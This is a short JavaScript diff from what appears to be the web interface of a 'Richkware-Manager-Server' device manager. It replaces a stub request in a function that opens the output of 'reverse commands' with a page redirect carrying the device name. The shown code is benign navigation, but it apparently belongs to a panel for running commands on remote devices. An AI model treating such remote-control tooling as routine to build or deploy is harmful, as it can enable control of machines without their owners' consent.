@@ -98,12 +98,7 @@ function openReverseCommands(name) {
 }
 
 function openReverseCommandsOutput(deviceName) {
-    // window.location.replace("/Richkware-Manager-Server/reverse-commands-output.html?output=\"" + commandsOutput + "\"")
-    $.get("command", {data0: deviceName, data1: "client"}, function (response) {
-        if (response.contains("OK")) {
-
-        }
-    })
+    window.location.replace("/Richkware-Manager-Server/reverse-commands-output.html?device=" + deviceName)
 }
 
 function deleteDevice(device, indexTableRow) {
